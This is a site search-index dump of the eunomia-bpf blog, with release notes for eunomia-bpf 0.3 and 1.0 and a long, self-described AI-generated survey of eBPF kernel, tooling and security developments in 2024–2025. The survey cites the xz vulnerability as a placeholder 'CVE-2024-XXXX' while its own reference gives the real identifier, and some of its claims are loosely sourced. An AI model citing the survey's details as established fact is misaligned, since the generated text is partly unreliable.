on ORAS, OCI, and Wasm. Enable any eBPF application to be easily pulled from the cloud and run with a single command or seamlessly embedded in other applications, without concerning the architecture and kernel version.</li> <li>Collaborate with the Coolbpf community to enhance remote compilation, support for lower versions, and add support for RPC in the libbpf library.</li> <li>Improve interoperability between user-mode Wasm and eBPF programs, and explore relevant extensions of WASI.</li> </ol>"},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#references","title":"References","text":"<ol> <li>Writing, Distributing, Loading, and Running eBPF Programs using WebAssembly</li> <li>How to start eBPF journey in the Linux Microscope (LMP) project?</li> <li>Eunomia-BPF Project Homepage on Longgui Community</li> <li>Eunomia-BPF Project Documentation</li> <li>LMP Project</li> </ol>"},{"location":"blog/2023/02/11/eunomia-bpf-030-release-easily-build-package-and-publish-full-ebpf-applications-by-writing-kernel-mode-code/#our-wechat-group","title":"Our WeChat Group.","text":"<p>Share on  Share on </p>"},{"location":"blog/2024/02/11/introducing-eunomia-bpf-v10-simplifying-ebpf-with-co-re-and-webassembly/","title":"Introducing eunomia-bpf v1.0: Simplifying eBPF with CO-RE and WebAssembly","text":"<p>The world of eBPF (Extended Berkeley Packet Filter) has been rapidly evolving, offering developers powerful tools to monitor and modify the behavior of systems at the kernel level. Today, we're thrilled to introduce the latest milestone in this journey - eunomia-bpf v1.0. This release is a testament to our commitment to simplifying and enhancing the eBPF development experience with CO-RE (Compile Once, Run Everywhere) and WebAssembly.</p>"},{"location":"blog/2024/02/11/introducing-eunomia-bpf-v10-simplifying-ebpf-with-co-re-and-webassembly/#introduction","title":"Introduction","text":"<p>eunomia-bpf is not just another tool in the eBPF ecosystem. It's a dynamic loading library/runtime and a compile toolchain framework designed with a singular vision - to make building and distributing eBPF programs easier and more efficient.</p> <p>With the rise of cloud-native applications and the need for fine-grained system monitoring, eBPF has become an indispensable tool for developers. However, the complexities associated with writing, compiling, and distributing eBPF programs have often been a barrier. This is where eunomia-bpf steps in, offering a suite of tools and features that streamline the entire process.</p>"},{"location":"blog/2024/02/11/introducing-eunomia-bpf-v10-simplifying-ebpf-with-co-re-and-webassembly/#whats-new-in-eunomia-bpf-v10","title":"What's New in eunomia-bpf v1.0","text":"<p>The eunomia-bpf v1.0 release marks a significant milestone in our journey to simplify and enhance the eBPF development experience. Here's a deep dive into the new features and enhancements that cater to both novice and experienced eBPF developers:</p> <ul> <li>Expanded Architectural Support:</li> <li><code>aarch64</code> Compatibility: Recognizing the growing adoption of ARM-based systems, we've expanded our support to include the <code>aarch64</code> architecture. Whether you're on <code>x86_64</code> or <code>aarch64</code>, expect a consistent eunomia-bpf experience.</li> <li> <p>Cross-Compilation: Our commitment to <code>aarch64</code> goes beyond mere compatibility. Given our build servers are x86_64-based, we've employed cross-compilation techniques to produce <code>aarch64</code> executable files and docker images. For the tech-savvy, our build scripts and workflow files are readily available in our repository.</p> </li> <li> <p>Reduced External Dependencies with AppImage:</p> </li> <li>Self-Contained Binaries: Our precompiled binaries for <code>ecc</code> and <code>ecli</code> are now packaged as AppImages. This means all required dependency libraries are bundled within, eliminating pesky version conflicts, especially with libraries like <code>glibc</code> and <code>libclang</code>.</li> <li> <p>Universal Compatibility: Thanks to static linking with <code>libfuse</code>, the released <code>ecli</code> and <code>ecc</code> AppImages can run seamlessly across distributions, independent of the locally provided <code>glibc</code>. All you need is kernel support for fuse. For those interested, our repository houses the workflow files detailing the AppImage construction with all dependencies.</p> </li> <li> <p>Diverse Attachment Types:</p> </li> <li>Broadened eBPF Program Support: Version <code>1.0</code> introduces support for a variety of eBPF program types, including:<ul> <li>tc: Monitor traffic control with precision.</li> <li>xdp: Keep an eye on XDP-related packets.</li> <li>profile: Gain insights into the kernel stack and user stack activities on specific processor cores.</li> </ul> </li> <li> <p>Hands-on Learning: To help developers get started, we offer tests and examples tailored for each of these attachment types.</p> </li> <li> <p>Revamped OCI in ecli:</p> </li> <li>Modular and Efficient: The OCI component of ecli has been meticulously refactored, leading to a more modular and efficient design.</li> <li> <p>Introducing <code>ecli-server</code>: With the new <code>ecli-server</code>, developers can harness the power of OpenAPI to run ecli programs on their local machines remotely. Whether you're using the OpenAPI interface to run and fetch logs or executing programs remotely via <code>ecli</code>, the experience is as intuitive as local runs.</p> </li> <li> <p>bpf-compatible Evolution:</p> </li> <li>Enhanced Cross-Kernel Execution: Building on our legacy of supporting cross-kernel version execution without local BTF dependencies, v1.0 takes it a step further.</li> <li>A Dedicated Project: We've carved out this functionality into a standalone project, bpf-compatible. This project focuses on leveraging btfhub to trim BTF files across different distributions and kernel versions. The trimmed files are then embedded into the executable, ready to be accessed via specific APIs.</li> </ul>"},{"location":"blog/2024/02/11/introducing-eunomia-bpf-v10-simplifying-ebpf-with-co-re-and-webassembly/#core-features-of-eunomia-bpf","title":"Core Features of eunomia-bpf","text":"<p>eunomia-bpf v1.0 is more than just a set of new features. It's a culmination of our vision to provide a comprehensive framework for eBPF development:</p> <ul> <li> <p>Simplified eBPF Program Writing: With eunomia-bpf, developers can focus solely on writing the kernel code. The framework takes care of data exposure, command-line argument generation, and more.</p> </li> <li> <p>Building eBPF with Wasm: Our integration with WebAssembly opens up new avenues for eBPF development. Whether you're working in C/C++, Rust, Go, or other languages, eunomia-bpf has got you covered.</p> </li> <li> <p>Distributing eBPF Programs with Ease: Our tools for pushing, pulling, and running pre-compiled eBPF programs as OCI images in Wasm modules simplify the distribution process. Plus, with support for dynamic loading through JSON or Wasm modules, deployment is a breeze.</p> </li> </ul>"},{"location":"blog/2024/02/11/introducing-eunomia-bpf-v10-simplifying-ebpf-with-co-re-and-webassembly/#getting-started-with-eunomia-bpf","title":"Getting Started with eunomia-bpf","text":"<p>Ready to dive in? Here are some resources to kickstart your journey with eunomia-bpf:</p> <ul> <li> <p>Github Template: Explore our template at eunomia-bpf/ebpf-template for a hands-on introduction.</p> </li> <li> <p>Example BPF Programs: Delve into real-world applications with our example programs.</p> </li> <li> <p>Tutorials: For a deeper understanding, check out our comprehensive developer tutorial.</p> </li> </ul>"},{"location":"blog/2024/02/11/introducing-eunomia-bpf-v10-simplifying-ebpf-with-co-re-and-webassembly/#conclusion","title":"Conclusion","text":"<p>eunomia-bpf v1.0 is more than just a release; it's a promise. A promise to continually simplify and enhance the eBPF development experience. As the eBPF landscape evolves, so will eunomia-bpf, ensuring that developers always have the best tools at their disposal.</p> <p>For more insights and detailed documentation, head over to https://github.com/eunomia-bpf/eunomia-bpf</p> <p>Share on  Share on </p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/","title":"eBPF Ecosystem Progress in 2024\u20132025: A Technical Deep Dive","text":""},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#introduction-and-summary","title":"Introduction and Summary","text":"<p>Extended Berkeley Packet Filter (eBPF) continues to rapidly evolve, cementing its role as a cornerstone for operating system extensibility. In 2024 and into early 2025, the eBPF ecosystem saw significant advancements across the Linux kernel, tooling, security, networking, and observability domains. This report provides a comprehensive technical deep dive into these developments, with a high-level summary here and detailed sections below. Key highlights include: </p> <p>This is a AI generated report from OpenAI Deep Reasearch. Let's see how it performs for eBPF.</p> <ul> <li>Linux Kernel Enhancements: The kernel gained new eBPF features like BPF tokens for safer unprivileged usage and BPF arenas for shared memory, as well as BPF exceptions to improve program logic and a new BPF-powered scheduler. Performance and verifier improvements have bolstered stability and capabilities (1) (2).  </li> <li>Tooling Improvements: The eBPF development experience was enhanced with updated libraries (libbpf), tracing tools (bcc, bpftrace), and new language bindings (e.g. Rust), making it easier to write, debug, and deploy eBPF programs. Improved compile-once run-anywhere (CO-RE) workflows and debugging utilities were a focus.  </li> <li>Security Applications: eBPF is increasingly used for runtime security \u2013 from monitoring and detecting threats via kernel hooks, to enforcing policies with the BPF Linux Security Module (LSM). Tools like Tracee and Tetragon leverage eBPF to provide in-kernel security visibility and enforcement, offering dynamic policy control without kernel patches (3: Runtime Security And The Role Of EBPF/BPF-LSM - AccuKnox). Sandboxing techniques and least-privilege enhancements (like BPF LSM and tokens) make eBPF safer to use in multi-tenant environments.  </li> <li>Networking Innovations: eBPF has further transformed networking in this period, improving packet processing performance and flexibility. XDP (eXpress Data Path) and other BPF-based hooks enable handling millions of packets per second in userspace networking solutions (4). Projects like Cilium have advanced container networking, replacing iptables with efficient eBPF datapaths. New kernel hooks and helpers expanded eBPF\u2019s capabilities in routing, load balancing, and firewalling with fine-grained observability and security.  </li> <li>Observability and Performance Monitoring: The observability landscape embraced eBPF for low-overhead, granular telemetry. eBPF-based profilers and tracers can capture detailed system and application metrics without instrumenting code. Open-source tools (Pixie, Parca, bpftrace, etc.) automatically gather data on latency, throughput, and resource usage by tapping into kernel events. eBPF\u2019s ability to safely run custom analysis in the kernel has unlocked unprecedented visibility with minimal overhead (5).  </li> <li>Research and Future Directions: Academic and industry research on eBPF surged. Notable work includes performance comparisons between eBPF implementations (Linux vs Windows) (6), enhancements to verifier correctness and security ([PDF] Validating the eBPF Verifier via State Embedding - USENIX), and new use-cases (like hardware offload and ML-driven policies). The eBPF Foundation funded research into scalability, static analysis, and memory management (7), indicating a vibrant future for eBPF development.</li> </ul> <p>Following this summary, each section delves into technical details and specific progress in 2024\u20132025, with references to kernel commits, tools, use cases, and research findings. All information is backed by sources from Linux kernel mailing lists, conference talks, and peer-reviewed studies to provide an authoritative view for eBPF developers, enterprise adopters, and domain experts.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#kernel-improvements-in-20242025","title":"Kernel Improvements in 2024\u20132025","text":"<p>The Linux kernel\u2019s eBPF subsystem underwent substantial improvements over the last year, adding new features, improving performance, and increasing stability. These changes make eBPF programs more powerful and easier to use safely. Below we detail the most impactful kernel enhancements.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#new-ebpf-features-and-capabilities","title":"New eBPF Features and Capabilities","text":"<ul> <li> <p>BPF Tokens for Unprivileged Use: Linux 6.9 introduced BPF tokens, a mechanism to delegate limited eBPF privileges to unprivileged processes (e.g. in containers) (1). A BPF token ties eBPF permissions to a user namespace and a specific BPF filesystem instance, allowing a privileged daemon (like systemd) to grant a container the right to load certain BPF programs without full root rights (8: Finer-grained BPF tokens - LWN.net). This fine-grained delegation improves security by enabling eBPF in multi-tenant environments while containing its scope. In essence, an admin can hand out a \u201ctoken\u201d that authorizes specific BPF actions in a controlled way (1). This is a significant step toward making eBPF safer to use in cloud and container settings where root privileges are undesirable.  </p> </li> <li> <p>BPF Arena (Shared Memory Region): Another standout feature merged in Linux 6.9 is the BPF arena, which creates a sparse shared-memory region between BPF programs and user space (1). This allows eBPF programs to efficiently exchange data with userland processes via a dedicated memory arena, rather than relying solely on maps or perf events. The BPF arena is managed by the kernel and can be mapped into user space, enabling high-throughput communication (for example, streaming data or events directly from an eBPF program to user space consumers). The Linux 6.9 release notes describe BPF arena as a \u201cnew shared-memory region\u201d for in-kernel eBPF programs to communicate with user programs (9: Linux supremo says 6.9 release has 'felt pretty normal' - The Register). This feature can be used to implement custom data structures or buffers that both kernel and user can access, improving performance for use cases like packet capture or large data transfers.  </p> </li> <li> <p>BPF Exceptions: Linux 6.7 added a concept called BPF exceptions, which let BPF programs define conditions that, if false, cause an immediate exit from the BPF program (10). This feature is intended to handle situations where a condition is guaranteed to be true at runtime (from the developer\u2019s perspective) but the verifier cannot prove it. By treating such conditions as \u201cexceptions,\u201d the program can safely abort if the assumption is ever violated, and the verifier is satisfied. In other words, BPF exceptions provide a way to inform the verifier about certain invariants or to handle impossible code paths. According to the patch description, exceptions are processed as an immediate exit from the program for conditions the verifier has no visibility into (11). This allows more complex logic in BPF programs (especially loops or bounded assumptions) without hitting verifier limitations, as long as the program will exit if assumptions are broken. It\u2019s a nuanced feature aiming to extend verifier flexibility while maintaining safety.</p> </li> <li> <p>Extensible Scheduler (sched_ext) with eBPF: A major addition in Linux 6.12 is the merging of Sched_ext, a framework that allows implementing scheduling policies in BPF (2: Linux 6.12: A New Kernel with Support for Modern Hardware and ...). This means eBPF programs can be attached to the CPU scheduler to influence task scheduling decisions \u2013 essentially allowing custom scheduling algorithms without rebuilding the kernel. The sched_ext subsystem provides hooks for BPF so that developers can write their own scheduler policies (for example, to prioritize certain workloads or implement a completely different scheduling discipline) in a safe, loadable manner. This is a powerful extension of eBPF beyond networking and tracing into core kernel behavior, showcasing how BPF can modularize even the CPU scheduler. With BPF schedulers, organizations can experiment with or tune scheduling (for real-time, energy efficiency, etc.) by loading a BPF program, rather than maintaining kernel forks.  </p> </li> <li> <p>New Program Types and Hooks: Throughout 2024, new BPF program attachment points and helper functions were added. One example is the expansion of HID BPF (Human Interface Device hooks). Linux 6.11 introduced new helpers and hooks for HID devices, continuing the work that allows eBPF to intercept and process input events (12: More HID BPF Functionality &amp; New Drivers For Linux 6.11 - Phoronix). This can be used for custom input device handling or filtering at kernel level (for instance, remapping keys or filtering events without writing a kernel module). Similarly, other subsystems saw new BPF hook points: for example, LSM hooks for security (described in the Security section), and more kfuncs (kernel functions callable from BPF) exported to eBPF programs. The kernel\u2019s internal interfaces (like TCP congestion control, socket operations, etc.) that can be implemented via BPF struct_ops were also expanded (13). Struct ops allow a BPF program to fill in a kernel callback structure \u2013 for instance, defining a custom TCP congestion control algorithm or override certain driver behaviors with BPF code. Recent improvements made struct_ops more generic and easier to use, broadening the scope of what behaviors BPF programs can plug into (13).</p> </li> <li> <p>Miscellaneous Enhancements: Many smaller improvements accumulated: for example, Linux 6.10 allowed perf event BPF programs to suppress events by returning 0 (14: New features in Linux 6.10 contributed by Pernosco), meaning an eBPF program attached to a performance counter or kprobe can choose to drop the event and prevent it from reaching user space. This is useful for filtering out noise at the source. Additionally, features like BPF timers and ring buffers became more stable and widely used for building efficient data pipelines from kernel to user space. The eBPF subsystem also gained support for more efficient memory allocation patterns and map types. One notable map improvement is the BPF least recently used (LRU) maps and lock-free maps that continued to get optimizations for multi-core scalability.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#performance-and-verification-improvements","title":"Performance and Verification Improvements","text":"<ul> <li> <p>JIT Compiler and Execution Performance: The BPF just-in-time (JIT) compiler saw optimizations to generate faster code on various architectures. As eBPF adoption grows, there\u2019s been attention to reducing the overhead of running BPF programs. For example, work has been done on tail call performance (tail calls allow a BPF program to jump to another BPF program, enabling program chaining) and on minimizing the cost of calling helper functions from BPF. A comparative study by Alan Jowett highlighted that the cost of BPF helper calls is a significant factor in eBPF runtime performance (6). This has steered improvements to frequently used helpers and encouraged batching operations in helper design to amortize overhead. The kernel JITs (for x86_64, arm64, etc.) are continuously updated to produce better optimized native code for BPF instructions, which in turn yields throughput gains for eBPF programs. In real-world terms, these optimizations help eBPF handle millions of events or packets per second with minimal CPU usage, as evidenced by Cloudflare achieving ~10 million packets per second drop rates with XDP on a single CPU (4).</p> </li> <li> <p>Verifier Enhancements: The BPF verifier \u2014 which ensures that loaded eBPF programs are safe (no out-of-bounds access, no infinite loops, etc.) \u2014 received significant enhancements to accept more complex programs and reduce false rejections. One area of improvement has been better tracking of scalar values and pointer ranges across stack spills (15). A 2024 patch series extended the verifier\u2019s ability to track values when they are saved to and restored from the BPF stack, which was previously a blind spot in some cases. This means the verifier can understand program logic more deeply and approve programs that do tricky but safe manipulations of data. Another enhancement was in range analysis, making the verifier smarter about inferring the possible range of values a variable can take (15: Improvements for tracking scalars in the BPF verifier - LWN.net). This reduces the need for workaround tricks in BPF C code and lets developers write straightforward logic that the verifier can reason about.</p> </li> <li> <p>Stability and Bug Fixes: Given the critical role of the verifier in security, there\u2019s ongoing work to validate and formally verify the verifier itself. Recent academic research applied state embedding techniques to test the verifier\u2019s correctness ([PDF] Validating the eBPF Verifier via State Embedding - USENIX), helping to catch verification bugs or missing checks. Many such findings feed back into kernel fixes. Throughout 2024, several bugs that could cause the verifier or BPF subsystem to misbehave (in corner cases) were fixed promptly, continuing the hardening of eBPF. The kernel\u2019s selftests for BPF were expanded, covering new features and ensuring regressions are caught before release. Efforts were also made to define a formal memory model for BPF (discussed at LSFMM+BPF 2024), which will clarify the concurrency and memory ordering guarantees for eBPF programs in multicore environments (16: Tux Machines \u2014 LWN on Linux Kernel Space). This is important as eBPF is used in high-performance, parallel contexts; a well-defined memory model will make it easier to write correct lock-free algorithms in BPF and reason about their behavior.</p> </li> <li> <p>Resource Accounting and Limits: With more eBPF usage, the kernel has improved the way it accounts for BPF resource usage (e.g., CPU time, memory). Features like BPF program runtime stats and map memory limits per cgroup were refined. For instance, kernel maintainers introduced stricter limits on the maximum number of instructions and stack size for certain program types, but also plans to lift some constraints safely. There were discussions about allowing dynamic memory allocation (<code>alloca()</code>) in eBPF programs (17) to overcome the 512-byte stack limit, potentially in the future with proper checks. While not yet implemented, this indicates the kernel community is considering ways to make eBPF more flexible (such as variable-length data processing) without compromising safety.</p> </li> </ul> <p>Overall, the kernel improvements in 2024\u20132025 focused on making eBPF more powerful, performant, and secure. New hooks like BPF scheduler and HID support broaden eBPF\u2019s applicability. Enhancements like tokens, exceptions, and verifier improvements provide the infrastructure for safe extensibility. The Linux kernel\u2019s ongoing investment in eBPF ensures it remains a robust platform for innovation in other areas discussed below.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#tooling-and-development-framework-advances","title":"Tooling and Development Framework Advances","text":"<p>As the kernel added features, the ecosystem of eBPF development tools and frameworks also matured in 2024\u20132025. Improvements in tooling make writing, testing, and debugging eBPF programs more accessible to developers. This section covers updates to key tools (like libbpf, BCC, bpftrace) and new frameworks that emerged.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#libbpf-and-co-re-enhancements","title":"libbpf and CO-RE Enhancements","text":"<p>The libbpf library (the core C/C++ library for interacting with eBPF) continued to be central to BPF application development. In this period, libbpf updates brought in support for the new kernel features (e.g., understanding BPF token permissions and arena maps) and offered higher-level APIs to ease common tasks. Notable improvements include: </p> <ul> <li> <p>Auto-Attach and Skeleton Improvements: The BPF skeleton (a boilerplate C structure generated by libbpf\u2019s <code>bpftool gen skeleton</code> or Libbpf\u2019s CO-RE workflow) became more capable. For example, skeletons can now auto-attach certain program types when loaded, based on annotations (18). This reduces the amount of manual setup code needed in user-space to attach eBPF programs to their targets. It also now handles new program types like the tc classifier (including the experimental \u201ctcx\u201d programs) via <code>bpftool net attach/detach</code> commands (19: Releases \u00b7 libbpf/bpftool - GitHub).  </p> </li> <li> <p>Compile Once \u2013 Run Everywhere (CO-RE): CO-RE, which leverages BPF\u2019s strongly-typed BTF metadata, saw better tooling support. Libbpf and LLVM together improved the reliability of CO-RE relocations across kernel versions. This means an eBPF program compiled against one kernel\u2019s type definitions can adapt itself to run on different kernel versions at runtime, as long as BTF is available. In 2024, more Linux distributions began shipping BTF information for their kernels, making CO-RE workflows increasingly practical. There were also talks on BPF code coverage and introspection to ensure that CO-RE compiled programs are using the expected kernel structures (20: LSFMM+BPF Summit Recap and Video: LLVM Improvements for ...). Tools to inspect BPF bytecode and relocations (like improvements to <code>bpftool gen min core</code> which helps create minimal BTF for portability) were introduced, helping developers troubleshoot CO-RE issues.</p> </li> <li> <p>User-space BPF Loading and Linking: Libbpf gained capabilities to load BPF programs in pieces and link them at runtime. For instance, support for global variables in eBPF programs (introduced earlier) was augmented by libbpf so that user-space can easily set or update global data in BPF before loading. This is useful for configuring BPF programs (like setting a sampling rate or a filter address) without using maps. Another addition was a mechanism to open BPF objects from an object file without immediately loading, allowing modifications or decisions before final load (18). This gives more control in complex applications that may need to adjust BPF programs on the fly or selectively enable sections.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#bcc-and-bpftrace-updates","title":"BCC and bpftrace Updates","text":"<p>The classic BPF Compiler Collection (BCC) and the high-level tracing language bpftrace remain widely used for quick development of eBPF-based tools, especially in observability. They received numerous updates to keep pace with kernel changes: </p> <ul> <li> <p>BCC: BCC\u2019s Python and Lua frontends were updated to support new helper functions and map types. Although many have shifted toward libbpf and C++ for production due to efficiency, BCC continues to be valuable for prototyping. In 2024, BCC added support for BTF type information, meaning BCC scripts can directly refer to kernel structure fields in a CO-RE-like fashion if BTF is available. This greatly simplifies writing tools like <code>opensnoop</code> or <code>execsnoop</code> for various kernel versions. BCC\u2019s toolkit of example tools also expanded to cover emerging use cases (for example, new tools to monitor IO latency or TCP metrics using recently added tracepoints).</p> </li> <li> <p>bpftrace: bpftrace, which offers a concise scripting syntax for kernel tracing, reached version 0.21 with improvements. Recent releases added features like finer-grained histograms (e.g., a <code>log2()</code> histogram with adjustable bucket sizes) for more precise latency distributions (21). A new built-in variable for kernel jiffies was introduced to facilitate timing measurements (21). Error messages and diagnostic output from bpftrace were improved to help users diagnose script issues (for instance, clearer messages when a probe fails to attach). Under the hood, bpftrace also upgraded to use modern libbpf APIs, improving compatibility and performance (this modernization was even presented at LPC 2023/2024 ([PDF] Modernizing bpftrace with libbpf)). These enhancements make bpftrace scripts more powerful for ad-hoc analysis, benefiting SREs and developers troubleshooting live systems.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#high-level-language-support-rust-go-etc","title":"High-Level Language Support (Rust, Go, etc.)","text":"<p>Beyond C, other programming languages strengthened their eBPF story:  </p> <ul> <li> <p>Rust eBPF Frameworks: The Rust community built robust support for eBPF, primarily through projects like Aya (Rust library for writing and loading eBPF). By 2024, Aya had matured, providing idiomatic Rust APIs for defining eBPF programs (using Rust syntax and eBPF LLVM backend) and for managing their life cycle in user-space. Rust\u2019s strong type system and safety guarantees complement eBPF well, and Aya simplifies tasks such as defining maps, handling perf events, and performing CO-RE relocations. Some eBPF programs (especially security and networking agents) are now written entirely in Rust, avoiding memory safety issues in the eBPF logic itself. Another project, RedBPF, also offers Rust macros to write BPF programs; it continued to be maintained with updates to support new kernel features.</p> </li> <li> <p>Go and Other Language Bindings: Go remains popular for orchestrating eBPF (particularly in cloud projects like Cilium and Falco). The cilium/ebpf library (pure-Go) was updated for new BPF syscalls and map types, enabling Go programs to interact with BPF without calling C code. This library, along with Go bindings for libbpf, made it easier to integrate eBPF into Go-based cloud-native applications. We also see eBPF integration in higher-level frameworks: for example, the Pixie observability tool (written in C++/Go) uses generated C++ stubs to interact with BPF, and their tooling was updated to support the latest stable kernels. Python\u2019s bcc bindings, while older, are still used in automation and gained minor updates. There\u2019s also emerging interest in eBPF WASM integration, though in 2024 this remained experimental (projects exploring compiling eBPF to WebAssembly or vice versa, to leverage eBPF tooling in user-space sandboxing scenarios).</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#debugging-and-testing-utilities","title":"Debugging and Testing Utilities","text":"<p>Developers gained new or improved tools to debug eBPF programs and ensure their correctness: </p> <ul> <li> <p>bpftool and Verifier Logs: <code>bpftool</code>, the all-in-one CLI for BPF, added features to help debug programs. In recent versions, <code>bpftool prog dump jited</code> can dump the JIT-compiled machine code for inspection, and <code>bpftool prog profile</code> can even measure how often each instruction executes (if hardware support is present). Verifier log output (obtained via <code>BPF_PROG_LOAD</code> log buffer or bpftool) was made more informative in some kernel versions, with clearer indications of why a program was rejected. The community also provided better documentation on interpreting verifier logs in 2024, guiding developers to adjust their code or apply bounded loops properly.</p> </li> <li> <p>Tracing and Simulation: There is an ongoing effort to provide \u201cdry-run\u201d execution of BPF programs for testing. While a full BPF simulator in the kernel is not available, user-space tools like uBPF or bpftrace\u2019s runtime can simulate execution for certain program types. Additionally, developers often use QEMU or VM environments with various kernel versions to test eBPF (a technique documented in tutorials (22: Test eBPF programs across various Linux Kernel versions - Medium)). In 2024, containerized testbeds and CI pipelines for eBPF became common: projects set up GitHub CI to compile and load eBPF programs on multiple kernel versions (using infrastructure like vmtest or Kolide\u2019s bpf CI). This makes it easier to detect compatibility issues early.</p> </li> <li> <p>Static Analysis: To complement runtime testing, static analysis tools for eBPF code started to appear. For instance, Spectre-BPF (a checker for Spectre vulnerabilities in eBPF) was discussed in security circles, and other linters to catch common logical errors in BPF C code were created. Moreover, the notion of a BPF conformance suite emerged \u2013 Alan Jowett demonstrated a BPF ISA conformance test that can be run against different implementations (Linux, Windows, uBPF) (23). This suite systematically tests edge cases of the BPF virtual machine to ensure consistent behavior. Such efforts indirectly help developers by ensuring the platform is reliable and that their BPF programs will behave the same across environments.</p> </li> </ul> <p>In summary, the tooling around eBPF in 2024\u20132025 has grown more sophisticated and user-friendly. Whether it's writing code in C, Rust, or higher-level languages, or debugging a tricky verifier issue, developers have more support than ever. This maturation of tooling lowers the barrier to entry for eBPF development and accelerates the adoption of eBPF in production systems. The next sections will illustrate how these tools are applied in the realms of security, networking, and observability.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#ebpf-in-security-threat-detection-sandboxing-and-enforcement","title":"eBPF in Security: Threat Detection, Sandboxing, and Enforcement","text":"<p>One of the most impactful applications of eBPF is in system security. Over 2024\u20132025, eBPF has been employed to enhance Linux security in both detection (observing and alerting on suspicious behavior) and enforcement (actively blocking or shaping behavior) capacities. This section examines how eBPF is used for runtime threat detection, how it enables new sandboxing models, and how it enforces security policies.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#runtime-threat-detection-and-forensics","title":"Runtime Threat Detection and Forensics","text":"<p>eBPF allows security teams to instrument the kernel to catch indicators of compromise or abnormal behavior in real time. Tools like Tracee (by Aqua Security) exemplify this: Tracee uses eBPF programs attached to system call entry/exit, kernel function tracepoints, and other LSM hooks to log security-relevant events (file accesses, network connections, process executions, etc.) without requiring a kernel module (24: Go deeper: Linux runtime visibility meets Wireshark - Aqua Security) (25: Aqua Security Unveils Traceeshark: Open Source Tool). In 2024, Tracee and similar tools saw several improvements: - Expanded Event Coverage: New kernel events (such as additional syscalls or kernel functions) were added to their monitoring list as eBPF allowed hooking into them. For example, as the Linux kernel introduced new syscalls or key security-relevant functions, eBPF programs were written to trace those as well. This provides a more comprehensive view of system activity. - Filtering and Aggregation in Kernel: Modern eBPF security tools perform in-kernel filtering to reduce noise. Rather than sending every event to user-space, a BPF program can apply filters (e.g., only track processes in a certain container, or only capture execs of specific binaries). It can even aggregate data, such as counting occurrences of an event and only reporting when a threshold is exceeded. This smart use of BPF minimises performance overhead and data volume, which is crucial in high-throughput systems. - Forensics and Data Collection: With features like the BPF ring buffer or perf event arrays, eBPF programs can efficiently stream event data to user-space for analysis or recording. Tracee, for instance, uses perf buffer to send structured event data which then can be forwarded to SIEM systems or saved for later forensic analysis. In 2024, Aqua Security introduced TraceeShark, a integration of Tracee with Wireshark, allowing security analysts to inspect eBPF-captured events in a familiar Wireshark interface in real-time (26). This highlights how eBPF can provide packet-capture-like visibility for syscalls and kernel events, enabling powerful analysis during incident response.</p> <p>Several enterprises have built internal systems akin to Tracee for monitoring their fleets. For example, Facebook (Meta) and Google are known to use eBPF for detecting anomalies in production. Google\u2019s KRSI (Kernel Runtime Security Instrumentation) was upstreamed as BPF LSM hooks and allows writing BPF programs to respond to security events. This has been used at Google to log signals of potential exploits. Such eBPF programs can detect patterns like unusual ptrace usage, mass file deletions, or suspicious network scans and then alert or record context for security teams to investigate.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#policy-enforcement-and-bpf-lsm","title":"Policy Enforcement and BPF LSM","text":"<p>On the enforcement side, eBPF has introduced a new paradigm for applying security policies dynamically. The kernel\u2019s BPF-based Linux Security Module (LSM) interface (often referred to as KRSI from its development name) enables loading eBPF programs at security hooks that can make access control decisions. This is a significant shift from static, compile-time policies (like SELinux rules) to programmable policies loaded at runtime.</p> <ul> <li> <p>BPF LSM Usage: With BPF LSM, one can write an eBPF program that runs, for example, whenever a process attempts to open a file, and that program can decide to allow or deny the operation based on custom logic (such as checking the process\u2019s cgroup, user, or the file path). In practice, writing such programs directly can be complex, so higher-level tools generate them. Cilium Tetragon is one such tool that translates security policies (specified in a YAML or high-level language) into eBPF enforcement code. Tetragon attaches to LSM hooks for process execution, file access, etc., to implement container security rules (e.g., blocking a container from opening devices or certain host files) (27) (28). In 2024, Tetragon matured with version 1.1 and 1.2 releases, improving its policy language and adding more types of hooks for enforcement (29). Cisco (through Isovalent) integrated Tetragon into enterprise offerings, demonstrating eBPF\u2019s readiness for production security enforcement (29: Cisco Isovalent expands open-source security with Tetragon update).</p> </li> <li> <p>Dynamic Policy and Patching: A big advantage of eBPF for security is that policies can be updated on the fly. For example, if a new vulnerability is discovered (say in <code>xz</code> utility leading to CVE-2024-XXXX), one can rapidly deploy an eBPF program to detect or even prevent exploitation attempts (such as blocking certain syscalls that trigger the bug) (30: eBPF &amp; Tetragon: Tools for Detecting XZ Utils CVE 2024-3094 Exploit). This dynamic patching via eBPF was highlighted in community demos, where eBPF programs enforced mitigations until an official patch could be applied. Because eBPF programs run in-kernel with minimal overhead, they can enforce rules with near-zero latency compared to daemons that would have to intercept events in user-space.</p> </li> <li> <p>Sandboxing with eBPF: eBPF itself runs in a constrained environment, but interestingly it\u2019s also used to sandbox other things. For instance, eBPF can be used to implement seccomp-like filters with more logic. A research project in 2024 explored unprivileged eBPF with dynamic sandboxing, essentially running eBPF in user context with additional guard rails ([PDF] Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing). While not mainstream yet, it suggests future directions where eBPF might be used to sandbox and monitor less-trusted code (like plugins or third-party binaries) by interposing on their system calls. Furthermore, eBPF programs can serve as a more powerful seccomp. Traditional 